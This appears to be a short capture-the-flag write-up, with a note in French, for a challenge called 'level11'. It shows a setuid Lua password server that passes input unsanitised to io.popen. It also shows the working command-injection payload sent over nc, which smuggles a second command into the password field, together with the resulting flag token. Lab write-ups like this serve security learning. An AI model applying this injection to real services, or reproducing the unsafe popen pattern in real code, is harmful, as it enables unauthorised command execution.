# level11

```bash
$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
$ cat level11.lua
```

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

La faille de sécurité du script Lua réside dans l'utilisation de `io.popen` avec une commande `echo` non sécurisée, permettant l'injection de commandes arbitraires.

```bash
$ nc localhost 5151
Password: getflag
Erf nope..
$ echo '; getflag > /tmp/flag11' | nc localhost 5151; cat /tmp/flag11
Password: Erf nope..
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
